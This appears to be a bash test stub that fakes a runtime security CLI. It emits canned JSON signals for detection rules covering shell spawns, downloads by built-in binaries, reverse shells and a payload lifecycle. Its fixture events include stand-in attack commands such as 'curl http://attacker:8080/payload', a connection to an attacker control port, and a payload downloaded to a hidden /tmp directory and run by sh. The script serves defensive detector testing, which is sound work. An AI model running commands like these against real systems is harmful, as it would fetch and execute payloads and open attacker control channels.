#!/usr/bin/env bash
set -euo pipefail

args="$*"
marker="${FAKE_MARKER:-marker-1}"
case_name="${FAKE_CASE:-ok}"

if [[ "$args" == *"signal watch"* && "$case_name" == "summary-overflow" ]]; then
  for id in $(seq 1 1001); do
    printf '{"eventFrames":[],"signalFrame":{"signal":{"id":"sig-%s","ruleId":"rule-a"}}}\n' "$id"
  done
  exit 0
fi

if [[ "$args" == *"signal watch"* && "$case_name" == "summary-mixed" ]]; then
  printf '%s\n' \
    '{"eventFrames":[{"event":{"subjectProc":{"argv":["sysarmor-one"]}}}],"signalFrame":{"signal":{"id":"sig-1","ruleId":"rule-a"}}}' \
    '{"eventFrames":[{"event":{"subjectProc":{"argv":["sysarmor-one"]}}}],"signalFrame":{"signal":{"id":"sig-1","ruleId":"rule-a"}}}' \
    '{"eventFrames":[],"signalFrame":{"signal":{"id":"sig-2","ruleId":"rule-b"}}}' \
    '{"eventFrames":[{"event":{"subjectProc":{"argv":["sysarmor-three"]}}}],"signalFrame":{"signal":{"id":"sig-3","ruleId":"rule-a"}}}'
  exit 0
fi

if [[ "$args" == *"agent health"* ]]; then
  printf '%s\n' '{"status":"ok","scope":{"type":"namespace","selector":"self"},"capability":{"backend":"tetragon"},"sensor":{"running":true,"policyLoaded":true}}'
  exit 0
fi

if [[ "$args" == *"event watch"* ]]; then
  if [[ "$case_name" == "external-marker" ]]; then
    printf '{"event":{"behavior":"process.exec","subjectProc":{"argv":["%s"]}}}\n' "$marker"
  fi
  exit 0
fi

rule=""
previous=""
for arg in "$@"; do
  if [[ "$previous" == "--rule-id" ]]; then
    rule="$arg"
    break
  fi
  previous="$arg"
done
[[ -n "$rule" ]] || rule="web_runtime_spawns_shell"

severity="high"
stage="SIGNAL_STAGE_CANDIDATE"
missing='null'
events='[]'
case "$rule" in
  web_runtime_spawns_shell)
    events="[{\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"$marker\"]}}}]"
    ;;
  download_by_lolbin)
    severity="medium"
    events="[{\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8080/file?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8080\"}}}]"
    ;;
  reverse_shell_pattern)
    severity="critical"
    stage="SIGNAL_STAGE_CONCLUSION"
    events="[{\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/bin/bash\",\"argv\":[\"/bin/bash\",\"$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}]"
    ;;
  suspicious_exec_connect)
    events="[\
      {\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"/tmp/.sysarmor-attack/$marker\"]}}},\
      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8443/control?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}\
    ]"
    ;;
  payload_lifecycle)
    events="[\
      {\"event\":{\"behavior\":\"file.write\",\"subjectProc\":{\"argv\":[\"curl\",\"-o\",\"/tmp/.sysarmor-attack/$marker\"]},\"object\":{\"filePath\":\"/tmp/.sysarmor-attack/$marker\"}}},\
      {\"event\":{\"behavior\":\"process.exec\",\"subjectProc\":{\"binary\":\"/bin/sh\",\"argv\":[\"/bin/sh\",\"/tmp/.sysarmor-attack/$marker\"]}}},\
      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8080/payload?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8080\"}}},\
      {\"event\":{\"behavior\":\"network.connect\",\"subjectProc\":{\"binary\":\"/usr/bin/curl\",\"argv\":[\"curl\",\"http://attacker:8443/control?marker=$marker\"]},\"object\":{\"socketAddr\":\"172.18.0.2:8443\"}}}\
    ]"
    ;;
esac

case "$case_name" in
  wrong-severity) severity="low" ;;
  wrong-stage) [[ "$stage" == "SIGNAL_STAGE_CONCLUSION" ]] && stage="SIGNAL_STAGE_CANDIDATE" || stage="SIGNAL_STAGE_CONCLUSION" ;;
  missing-ref) missing='["event-missing"]' ;;
  missing-behavior) events="$(printf '%s' "$events" | jq -c '[.[] | select(.event.behavior != "file.write")]')" ;;
  wrong-port) events="$(printf '%s' "$events" | sed -e 's/:8080/:80/g' -e 's/:8443/:4443/g')" ;;
esac

jq -cn --arg rule "$rule" --arg signal_id "sig-fake-$rule" --arg severity "$severity" --arg stage "$stage" \
  --argjson missing "$missing" --argjson events "$events" \
  '{eventFrames:$events,missingEventRefs:$missing,signalFrame:{signal:{id:$signal_id,ruleId:$rule,severity:$severity,stage:$stage}}}'
